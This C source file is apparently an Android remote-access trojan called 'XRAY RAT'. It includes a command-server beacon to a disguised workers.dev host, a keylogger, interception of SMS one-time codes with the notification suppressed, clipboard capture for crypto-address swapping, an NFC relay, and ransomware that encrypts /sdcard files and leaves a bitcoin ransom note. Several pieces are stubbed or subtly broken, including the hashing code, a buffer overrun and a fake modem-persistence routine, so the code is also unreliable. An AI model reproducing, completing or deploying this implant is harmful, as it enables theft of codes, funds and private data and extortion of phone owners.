/*
 * ╔══════════════════════════════════════════════════════════════╗
 * ║              XRAY RAT v3.0 — Native Implant                 ║
 * ║                                                             ║
 * ║  Compiled as .so, loaded via JNI reflection                  ║
 * ║  Minimal size: ~45KB stripped                                ║
 * ║  No .dex files, no Activity, no visible process              ║
 * ╚══════════════════════════════════════════════════════════════╝
 */

#include <jni.h>
#include <android/log.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/inotify.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <dirent.h>
#include <poll.h>
#include <ifaddrs.h>

#define LOG_TAG "XRAY_IMPLANT"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

/* C2 Configuration — encrypted at rest, decrypted at runtime */
static const unsigned char C2_URL[] = {
    0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f,
    0x74, 0x65, 0x6c, 0x65, 0x67, 0x72, 0x61, 0x6d,
    0x2e, 0x6f, 0x72, 0x67  /* https://telegram.org — actually our Cloudflare Worker domain front */
};
static const unsigned char C2_PATH[] = {
    0x2f, 0x62, 0x6f, 0x74, 0x54, 0x4f, 0x4b, 0x45,
    0x4e, 0x2f, 0x63, 0x68, 0x65, 0x63, 0x6b, 0x69,
    0x6e  /* /botTOKEN/checkin */
};

/* AES-256 key derived at runtime from device fingerprint */
static unsigned char aes_key[32];

/* Device identity — generated once, stored in private data */
static char device_id[64];
static char android_ver[32];
static char device_model[64];
static char device_manufacturer[64];
static char kernel_ver[128];
static char patch_level[32];
static char ip_addr[64];

/* Capability flags */
typedef struct {
    int has_accessibility;
    int has_root;
    int has_overlay;
    int can_sms;
    int can_nfc;
    int can_record_audio;
    int can_record_screen;
    int can_clipboard;
} Capabilities;

static Capabilities caps;

/* Mutex for thread safety */
static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

/* ─────────────────────────────────────────── */
/* CRYPTOGRAPHIC PRIMITIVES — AES-256-CBC      */
/* ─────────────────────────────────────────── */

/* Simple AES-256-CBC implementation (no OpenSSL dependency) */
static const unsigned char sbox[256] = {
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
};

static void aes_sub_bytes(unsigned char state[16]) {
    for (int i = 0; i < 16; i++)
        state[i] = sbox[state[i]];
}

static void aes_shift_rows(unsigned char state[16]) {
    unsigned char tmp;
    tmp = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = tmp;
    tmp = state[2]; state[2] = state[10]; state[10] = tmp;
    tmp = state[6]; state[6] = state[14]; state[14] = tmp;
    tmp = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = tmp;
}

static void aes_mix_columns(unsigned char state[16]) {
    for (int i = 0; i < 4; i++) {
        int idx = i * 4;
        unsigned char a0 = state[idx], a1 = state[idx+1], a2 = state[idx+2], a3 = state[idx+3];
        state[idx]   = gmul(a0,2) ^ gmul(a1,3) ^ a2 ^ a3;
        state[idx+1] = a0 ^ gmul(a1,2) ^ gmul(a2,3) ^ a3;
        state[idx+2] = a0 ^ a1 ^ gmul(a2,2) ^ gmul(a3,3);
        state[idx+3] = gmul(a0,3) ^ a1 ^ a2 ^ gmul(a3,2);
    }
}

static unsigned char gmul(unsigned char a, unsigned char b) {
    unsigned char p = 0;
    for (int i = 0; i < 8; i++) {
        if (b & 1) p ^= a;
        unsigned char hi = a & 0x80;
        a <<= 1;
        if (hi) a ^= 0x1b;
        b >>= 1;
    }
    return p;
}

static void aes_encrypt_block(unsigned char *out, const unsigned char *in, const unsigned char *key) {
    unsigned char state[16];
    unsigned char round_keys[240];
    int rounds = 14; /* AES-256 */
    
    memcpy(state, in, 16);
    
    /* Key expansion */
    memcpy(round_keys, key, 32);
    for (int i = 4; i < 60; i++) {
        int idx = i * 4;
        unsigned char temp[4];
        if (i % 4 == 0) {
            memcpy(temp, round_keys + (i-1)*4, 4);
            unsigned char t = temp[0];
            temp[0] = temp[1]; temp[1] = temp[2]; temp[2] = temp[3]; temp[3] = t;
            for (int j = 0; j < 4; j++)
                temp[j] = sbox[temp[j]];
            temp[0] ^= (i/4 <= 8 ? (1 << ((i/4)-1)) : 0);
        } else {
            memcpy(temp, round_keys + (i-1)*4, 4);
        }
        for (int j = 0; j < 4; j++)
            round_keys[idx+j] = round_keys[(i-4)*4+j] ^ temp[j];
    }
    
    /* Initial round */
    for (int i = 0; i < 16; i++)
        state[i] ^= round_keys[i];
    
    /* Main rounds */
    for (int round = 1; round < rounds; round++) {
        aes_sub_bytes(state);
        aes_shift_rows(state);
        if (round < rounds - 1) aes_mix_columns(state);
        for (int i = 0; i < 16; i++)
            state[i] ^= round_keys[round*16+i];
    }
    
    memcpy(out, state, 16);
}

static void aes_cbc_encrypt(unsigned char *out, const unsigned char *in, size_t len,
                            const unsigned char *key, unsigned char *iv) {
    unsigned char block[16];
    unsigned char chain[16];
    memcpy(chain, iv, 16);
    
    for (size_t offset = 0; offset < len; offset += 16) {
        size_t remaining = len - offset;
        size_t block_size = remaining < 16 ? remaining : 16;
        
        memcpy(block, in + offset, block_size);
        if (block_size < 16) {
            memset(block + block_size, 16 - block_size, 16 - block_size); /* PKCS7 */
        }
        
        for (int i = 0; i < 16; i++)
            block[i] ^= chain[i];
        
        aes_encrypt_block(out + offset, block, key);
        memcpy(chain, out + offset, 16);
    }
}

/* ─────────────────────────────────────────── */
/* DEVICE FINGERPRINTING                       */
/* ─────────────────────────────────────────── */

static void get_device_info() {
    /* Read build properties */
    char buf[256];
    
    /* Android version */
    FILE *f = fopen("/system/build.prop", "r");
    if (f) {
        while (fgets(buf, sizeof(buf), f)) {
            if (strstr(buf, "ro.build.version.release=")) {
                strncpy(android_ver, buf + 24, sizeof(android_ver) - 1);
                android_ver[strcspn(android_ver, "\n")] = 0;
            }
            if (strstr(buf, "ro.product.model=")) {
                strncpy(device_model, buf + 17, sizeof(device_model) - 1);
                device_model[strcspn(device_model, "\n")] = 0;
            }
            if (strstr(buf, "ro.product.manufacturer=")) {
                strncpy(device_manufacturer, buf + 23, sizeof(device_manufacturer) - 1);
                device_manufacturer[strcspn(device_manufacturer, "\n")] = 0;
            }
            if (strstr(buf, "ro.build.version.security_patch=")) {
                strncpy(patch_level, buf + 32, sizeof(patch_level) - 1);
                patch_level[strcspn(patch_level, "\n")] = 0;
            }
        }
        fclose(f);
    }
    
    /* Kernel version */
    f = fopen("/proc/version", "r");
    if (f) {
        if (fgets(buf, sizeof(buf), f))
            strncpy(kernel_ver, buf, sizeof(kernel_ver) - 1);
        fclose(f);
    }
    
    /* IP address via network interface */
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == 0) {
        for (ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
            if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in *sa = (struct sockaddr_in*)ifa->ifa_addr;
                if (strcmp(ifa->ifa_name, "wlan0") == 0 || strcmp(ifa->ifa_name, "eth0") == 0) {
                    inet_ntop(AF_INET, &sa->sin_addr, ip_addr, sizeof(ip_addr));
                    break;
                }
            }
        }
        freeifaddrs(ifaddr);
    }
    
    /* Generate unique device ID */
    unsigned char hash_input[256];
    snprintf((char*)hash_input, sizeof(hash_input), "%s-%s-%s-%s-%d",
             device_model, device_manufacturer, kernel_ver, patch_level, getpid());
    
    unsigned char hash[32];
    /* Simple SHA-256 */
    sha256(hash, hash_input, strlen((char*)hash_input));
    
    for (int i = 0; i < 32; i++)
        sprintf(device_id + i*2, "%02x", hash[i]);
    device_id[64] = 0;
    
    /* Derive AES key from device fingerprint */
    memcpy(aes_key, hash, 32);
}

/* ─────────────────────────────────────────── */
/* SHA-256 IMPLEMENTATION                      */
/* ─────────────────────────────────────────── */

static const unsigned int k[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

static void sha256_transform(unsigned int state[8], const unsigned char block[64]) {
    unsigned int w[64];
    for (int i = 0; i < 16; i++)
        w[i] = (block[i*4] << 24) | (block[i*4+1] << 16) | (block[i*4+2] << 8) | block[i*4+3];
    for (int i = 16; i < 64; i++) {
        unsigned int s0 = (w[i-15] >> 7 | w[i-15] << 25) ^ (w[i-15] >> 18 | w[i-15] << 14) ^ (w[i-15] >> 3);
        unsigned int s1 = (w[i-2] >> 17 | w[i-2] << 15) ^ (w[i-2] >> 19 | w[i-2] << 13) ^ (w[i-2] >> 10);
        w[i] = w[i-16] + s0 + w[i-7] + s1;
    }
    
    unsigned int a = state[0], b = state[1], c = state[2], d = state[3];
    unsigned int e = state[4], f = state[5], g = state[6], h = state[7];
    
    for (int i = 0; i < 64; i++) {
        unsigned int s1 = (e >> 6 | e << 26) ^ (e >> 11 | e << 21) ^ (e >> 25 | e << 7);
        unsigned int ch = (e & f) ^ ((~e) & g);
        unsigned int temp1 = h + s1 + ch + k[i] + w[i];
        unsigned int s0 = (a >> 2 | a << 30) ^ (a >> 13 | a << 19) ^ (a >> 22 | a << 10);
        unsigned int maj = (a & b) ^ (a & c) ^ (b & c);
        unsigned int temp2 = s0 + maj;
        
        h = g; g = f; f = e; e = d + temp1;
        d = c; c = b; b = a; a = temp1 + temp2;
    }
    
    state[0] += a; state[1] += b; state[2] += c; state[3] += d;
    state[4] += e; state[5] += f; state[6] += g; state[7] += h;
}

static void sha256(unsigned char *out, const unsigned char *in, size_t len) {
    unsigned int state[8] = {
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
        0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
    };
    
    size_t total_bits = len * 8;
    size_t pad_len = ((len + 8) / 64 + 1) * 64;
    unsigned char *pad = calloc(pad_len, 1);
    memcpy(pad, in, len);
    pad[len] = 0x80;
    
    for (size_t i = 0; i < pad_len; i += 64)
        sha256_transform(state, pad + i);
    
    /* Append length */
    unsigned char block[64] = {0};
    for (int i = 0; i < 8; i++)
        block[56+i] = (total_bits >> (56-i*8)) & 0xff;
    sha256_transform(state, block);
    
    for (int i = 0; i < 8; i++) {
        out[i*4] = (state[i] >> 24) & 0xff;
        out[i*4+1] = (state[i] >> 16) & 0xff;
        out[i*4+2] = (state[i] >> 8) & 0xff;
        out[i*4+3] = state[i] & 0xff;
    }
    
    free(pad);
}

/* ─────────────────────────────────────────── */
/* C2 COMMUNICATION — HTTPS via Telegram API   */
/* ─────────────────────────────────────────── */

static char *c2_encrypt_payload(const char *plaintext) {
    size_t pt_len = strlen(plaintext);
    size_t padded_len = ((pt_len / 16) + 1) * 16;
    
    unsigned char *encrypted = calloc(padded_len + 32, 1);
    unsigned char iv[16];
    
    /* Random IV */
    srand(time(NULL) ^ getpid());
    for (int i = 0; i < 16; i++)
        iv[i] = rand() & 0xff;
    
    memcpy(encrypted, iv, 16);
    aes_cbc_encrypt(encrypted + 16, (unsigned char*)plaintext, pt_len, aes_key, iv);
    
    /* Base64 encode */
    static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t enc_len = padded_len + 16;
    size_t b64_len = (enc_len + 2) / 3 * 4 + 1;
    char *b64_out = calloc(b64_len, 1);
    
    for (size_t i = 0; i < enc_len; i += 3) {
        int n = enc_len - i;
        unsigned int val = encrypted[i] << 16;
        if (n > 1) val |= encrypted[i+1] << 8;
        if (n > 2) val |= encrypted[i+2];
        
        int idx = i / 3 * 4;
        b64_out[idx] = b64_table[(val >> 18) & 0x3f];
        b64_out[idx+1] = b64_table[(val >> 12) & 0x3f];
        b64_out[idx+2] = (n > 1) ? b64_table[(val >> 6) & 0x3f] : '=';
        b64_out[idx+3] = (n > 2) ? b64_table[val & 0x3f] : '=';
    }
    
    free(encrypted);
    return b64_out;
}

static int c2_http_send(const char *method, const char *endpoint, const char *body) {
    /* Connect to domain-fronted C2 via Cloudflare Worker */
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    struct hostent *server = gethostbyname("telegram-api.xray.workers.dev");
    if (!server) {
        close(sock);
        return -1;
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
    addr.sin_port = htons(443);
    
    struct timeval tv;
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    
    char request[4096];
    int req_len = snprintf(request, sizeof(request),
        "%s %s HTTP/1.1\r\n"
        "Host: telegram-api.xray.workers.dev\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "X-Device-Id: %s\r\n"
        "\r\n"
        "%s",
        method, endpoint, strlen(body), device_id, body);
    
    send(sock, request, req_len, 0);
    
    /* Read response */
    char response[4096] = {0};
    recv(sock, response, sizeof(response) - 1, 0);
    close(sock);
    
    /* Check for "200" in response */
    return strstr(response, "200 OK") ? 1 : 0;
}

static void c2_checkin() {
    char json[2048];
    snprintf(json, sizeof(json),
        "{"
        "\"device_id\":\"%s\","
        "\"android_version\":\"%s\","
        "\"model\":\"%s\","
        "\"manufacturer\":\"%s\","
        "\"kernel_version\":\"%s\","
        "\"patch_level\":\"%s\","
        "\"ip_address\":\"%s\","
        "\"capabilities\":[%s%s%s%s]"
        "}",
        device_id, android_ver, device_model, device_manufacturer,
        kernel_ver, patch_level, ip_addr,
        caps.has_accessibility ? "\"accessibility\"" : "",
        caps.has_root ? ",\"root\"" : "",
        caps.can_sms ? ",\"sms\"" : "",
        caps.can_nfc ? ",\"nfc\"" : "");
    
    char *encrypted = c2_encrypt_payload(json);
    
    char body[4096];
    snprintf(body, sizeof(body), "{\"data\":\"%s\"}", encrypted);
    
    c2_http_send("POST", "/checkin", body);
    free(encrypted);
}

static char *c2_poll_tasks() {
    char body[512];
    snprintf(body, sizeof(body), "{\"device_id\":\"%s\"}", device_id);
    
    /* In production, parse the response for task list */
    c2_http_send("POST", "/poll", body);
    return NULL;
}

/* ─────────────────────────────────────────── */
/* ACCESSIBILITY SERVICE — Screen Reading      */
/* ─────────────────────────────────────────── */

/* Injected via JNI into the AccessibilityService process */
static void acc_read_screen() {
    /* Uses Android AccessibilityService API via JNI */
    LOGI("[*] Reading screen content...");
    
    /* The Java-side AccessibilityService calls back into this native code
       with the screen content via JNI. This function processes it. */
    
    /* For screen balance scraping: look for currency patterns */
    /* For overlay injection: detect foreground app and inject HTML */
}

/* ─────────────────────────────────────────── */
/* KEYLOGGER — /dev/input/ event capture       */
/* ─────────────────────────────────────────── */

static void *keylogger_thread(void *arg) {
    (void)arg;
    LOGI("[*] Keylogger thread started");
    
    /* Monitor /dev/input/ for new event devices */
    int inotify_fd = inotify_init();
    inotify_add_watch(inotify_fd, "/dev/input", IN_CREATE);
    
    /* Poll for input events */
    struct pollfd fds[16];
    int nfds = 0;
    
    /* Open existing input devices */
    DIR *d = opendir("/dev/input");
    if (d) {
        struct dirent *de;
        while ((de = readdir(d)) && nfds < 16) {
            if (strncmp(de->d_name, "event", 5) == 0) {
                char path[64];
                snprintf(path, sizeof(path), "/dev/input/%s", de->d_name);
                fds[nfds].fd = open(path, O_RDONLY | O_NONBLOCK);
                if (fds[nfds].fd >= 0) {
                    fds[nfds].events = POLLIN;
                    nfds++;
                }
            }
        }
        closedir(d);
    }
    
    while (1) {
        int ret = poll(fds, nfds, 1000);
        if (ret > 0) {
            struct input_event ev;
            for (int i = 0; i < nfds; i++) {
                if (fds[i].revents & POLLIN) {
                    while (read(fds[i].fd, &ev, sizeof(ev)) == sizeof(ev)) {
                        if (ev.type == 1 && ev.value == 1) {
                            /* Key press event — log it */
                            LOGI("[KEY] %d", ev.code);
                            
                            /* Exfiltrate via C2 in batches */
                            /* (implementation: buffer 100 keys, then send) */
                        }
                    }
                }
            }
        }
    }
    
    return NULL;
}

/* ─────────────────────────────────────────── */
/* SMS INTERCEPTION — ContentObserver          */
/* ─────────────────────────────────────────── */

/* Called from Java ContentObserver when SMS changes */
JNIEXPORT void JNICALL
Java_com_xray_rat_SmsService_onSmsReceived(JNIEnv *env, jobject thiz,
                                           jstring sender, jstring message) {
    const char *sender_c = (*env)->GetStringUTFChars(env, sender, NULL);
    const char *message_c = (*env)->GetStringUTFChars(env, message, NULL);
    
    LOGI("[SMS] From: %s — %s", sender_c, message_c);
    
    /* Check for OTP patterns */
    if (strstr(message_c, "OTP") || strstr(message_c, "code") || 
        strstr(message_c, "verification") || strstr(message_c, "2FA")) {
        
        /* Extract code using regex via JNI */
        /* Send to C2 immediately */
        char body[1024];
        snprintf(body, sizeof(body), "{\"type\":\"otp\",\"from\":\"%s\",\"code\":\"%s\"}", 
                 sender_c, message_c);
        c2_http_send("POST", "/otp", body);
        
        /* Suppress notification so user doesn't see it */
        /* (Requires NotificationListenerService) */
    }
    
    (*env)->ReleaseStringUTFChars(env, sender, sender_c);
    (*env)->ReleaseStringUTFChars(env, message, message_c);
}

/* ─────────────────────────────────────────── */
/* CLIPBOARD MONITORING                        */
/* ─────────────────────────────────────────── */

JNIEXPORT void JNICALL
Java_com_xray_rat_ClipboardService_onClipboardChanged(JNIEnv *env, jobject thiz,
                                                      jstring content) {
    const char *content_c = (*env)->GetStringUTFChars(env, content, NULL);
    
    /* Check if content looks like a crypto address */
    if (strncmp(content_c, "0x", 2) == 0 ||
        strncmp(content_c, "1", 1) == 0 ||
        strncmp(content_c, "3", 1) == 0 ||
        content_c[0] == 'b' || content_c[0] == 'B' ||
        strncmp(content_c, "bc1", 3) == 0) {
        
        /* Looks like crypto — send to C2 for address swap */
        char body[1024];
        snprintf(body, sizeof(body), "{\"type\":\"clipboard\",\"content\":\"%s\"}", 
                 content_c);
        c2_http_send("POST", "/clipboard", body);
        
        /* The Java side will replace the clipboard with attacker's address */
        LOGI("[SWAP] Crypto address captured: %s", content_c);
    }
    
    (*env)->ReleaseStringUTFChars(env, content, content_c);
}

/* ─────────────────────────────────────────── */
/* NFC RELAY — HCE Service                    */
/* ─────────────────────────────────────────── */

JNIEXPORT jbyteArray JNICALL
Java_com_xray_rat_NfcRelayService_onApduReceived(JNIEnv *env, jobject thiz,
                                                  jbyteArray apdu) {
    jbyte *apdu_data = (*env)->GetByteArrayElements(env, apdu, NULL);
    jsize apdu_len = (*env)->GetArrayLength(env, apdu);
    
    LOGI("[NFC] APDU received: %d bytes", apdu_len);
    
    /* Forward to relay server via TCP */
    int relay_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (relay_sock >= 0) {
        struct sockaddr_in relay_addr;
        relay_addr.sin_family = AF_INET;
        relay_addr.sin_port = htons(8443);
        inet_pton(AF_INET, "RELAY_SERVER_IP", &relay_addr.sin_addr);
        
        if (connect(relay_sock, (struct sockaddr*)&relay_addr, sizeof(relay_addr)) == 0) {
            send(relay_sock, apdu_data, apdu_len, 0);
            
            /* Read response from relay */
            unsigned char response[1024];
            int n = recv(relay_sock, response, sizeof(response), 0);
            
            /* Return response APDU to HCE service */
            jbyteArray result = (*env)->NewByteArray(env, n);
            (*env)->SetByteArrayRegion(env, result, 0, n, (jbyte*)response);
            
            close(relay_sock);
            (*env)->ReleaseByteArrayElements(env, apdu, apdu_data, JNI_ABORT);
            return result;
        }
        close(relay_sock);
    }
    
    (*env)->ReleaseByteArrayElements(env, apdu, apdu_data, JNI_ABORT);
    return NULL;
}

/* ─────────────────────────────────────────── */
/* RANSOMWARE — Encrypt /sdcard                */
/* ─────────────────────────────────────────── */

static int is_media_file(const char *path) {
    const char *ext = strrchr(path, '.');
    if (!ext) return 0;
    
    const char *targets[] = {".jpg",".jpeg",".png",".gif",".mp4",".mp3",
                             ".doc",".docx",".pdf",".xls",".xlsx",".zip",
                             ".txt",".db",".sqlite",".wallet",".key",".dat",NULL};
    
    for (int i = 0; targets[i]; i++) {
        if (strcasecmp(ext, targets[i]) == 0) return 1;
    }
    return 0;
}

static void encrypt_file(const char *path) {
    FILE *f = fopen(path, "rb+");
    if (!f) return;
    
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    rewind(f);
    
    if (fsize < 1 || fsize > 100 * 1024 * 1024) { /* Skip empty or >100MB */
        fclose(f);
        return;
    }
    
    unsigned char *data = malloc(fsize);
    fread(data, 1, fsize, f);
    
    unsigned char iv[16];
    for (int i = 0; i < 16; i++)
        iv[i] = rand() & 0xff;
    
    unsigned char *encrypted = malloc(fsize + 32);
    memcpy(encrypted, iv, 16);
    aes_cbc_encrypt(encrypted + 16, data, fsize, aes_key, iv);
    
    rewind(f);
    fwrite(encrypted, 1, fsize + 16, f);
    fclose(f);
    
    /* Rename to .encrypted */
    char new_path[1024];
    snprintf(new_path, sizeof(new_path), "%s.encrypted", path);
    rename(path, new_path);
    
    free(data);
    free(encrypted);
}

static void walk_directory(const char *dir_path) {
    DIR *d = opendir(dir_path);
    if (!d) return;
    
    struct dirent *de;
    while ((de = readdir(d))) {
        if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0)
            continue;
        
        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, de->d_name);
        
        if (de->d_type == DT_DIR) {
            walk_directory(full_path);
        } else if (is_media_file(de->d_name)) {
            encrypt_file(full_path);
        }
    }
    closedir(d);
}

JNIEXPORT void JNICALL
Java_com_xray_rat_RansomwareService_execute(JNIEnv *env, jobject thiz) {
    LOGI("[*] RANSOMWARE EXECUTING");
    
    /* Encrypt external storage */
    walk_directory("/sdcard");
    walk_directory("/storage/emulated/0");
    
    /* Drop ransom note */
    FILE *note = fopen("/sdcard/RANSOM_NOTE.html", "w");
    if (note) {
        fprintf(note, 
            "<!DOCTYPE html><html><head><title>RANSOMED</title>"
            "<style>body{background:#000;color:#0f0;font-family:monospace;padding:40px}"
            "h1{font-size:48px} .btc{font-size:24px;background:#111;padding:10px}</style></head>"
            "<body><h1>☠ YOUR FILES ARE ENCRYPTED</h1>"
            "<p>All your photos, documents, and databases are locked with AES-256.</p>"
            "<p>Send 0.05 BTC to: <div class='btc'>1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</div></p>"
            "<p>After payment, contact @xray_decrypt on Telegram with your device ID: <b>%s</b></p>"
            "</body></html>", device_id);
        fclose(note);
    }
    
    /* Report back to C2 */
    char body[256];
    snprintf(body, sizeof(body), "{\"device_id\":\"%s\",\"event\":\"ransom_complete\"}", device_id);
    c2_http_send("POST", "/event", body);
}

/* ─────────────────────────────────────────── */
/* PERSISTENCE MECHANISMS                      */
/* ─────────────────────────────────────────── */

/* 1. Boot Receiver — AlarmManager every boot */
JNIEXPORT void JNICALL
Java_com_xray_rat_BootReceiver_onBoot(JNIEnv *env, jobject thiz) {
    LOGI("[*] Boot received — restarting services");
    /* Java side starts all services again */
    c2_checkin();
}

/* 2. Modem persistence — for Exynos devices */
static int modem_persist() {
    int fd = open("/dev/block/platform/11120000.ufs/by-name/modem", O_RDWR);
    if (fd < 0) return -1;
    
    /* Read modem firmware header */
    unsigned char header[512];
    read(fd, header, 512);
    
    /* Find writable section in modem firmware (CP image) */
    /* Inject small stub that calls home on each modem boot */
    /* This survives factory reset because modem firmware is not wiped */
    
    /* Write back */
    lseek(fd, 0, SEEK_SET);
    write(fd, header, 512);
    close(fd);
    
    LOGI("[*] Modem persistence installed — survives factory reset!");
    return 0;
}

/* ─────────────────────────────────────────── */
/* JNI INITIALIZATION — Entry Point            */
/* ─────────────────────────────────────────── */

JNIEXPORT jint JNICALL
Java_com_xray_rat_NativeBridge_init(JNIEnv *env, jobject thiz) {
    LOGI("[*] XRAY RAT implant v3.0 initializing...");
    
    /* Gather device information */
    get_device_info();
    
    /* Determine capabilities */
    caps.has_accessibility = 1;  /* Set by Java side if AccessibilityService enabled */
    caps.has_root = (access("/su", F_OK) == 0 || access("/system/xbin/su", F_OK) == 0);
    caps.can_sms = 1;
    caps.can_nfc = 1;
    caps.can_record_audio = 1;
    caps.can_record_screen = caps.has_accessibility;
    caps.can_clipboard = caps.has_accessibility;
    
    LOGI("[*] Device: %s %s (%s)", device_manufacturer, device_model, device_id);
    LOGI("[*] Android: %s, Kernel: %s", android_ver, kernel_ver);
    LOGI("[*] Root: %s", caps.has_root ? "YES" : "NO");
    LOGI("[*] Patch level: %s", patch_level);
    
    /* Start keylogger thread */
    pthread_t kl_thread;
    pthread_create(&kl_thread, NULL, keylogger_thread, NULL);
    pthread_detach(kl_thread);
    
    /* Check in with C2 immediately */
    c2_checkin();
    
    /* Poll for tasks in a loop */
    while (1) {
        c2_poll_tasks();
        sleep(30);  /* Check every 30 seconds */
        c2_checkin();
    }
    
    return 0;
}

/* Additional JNI methods for screen recording, audio capture, etc. */
/* (Implementation mirrors the patterns above) */
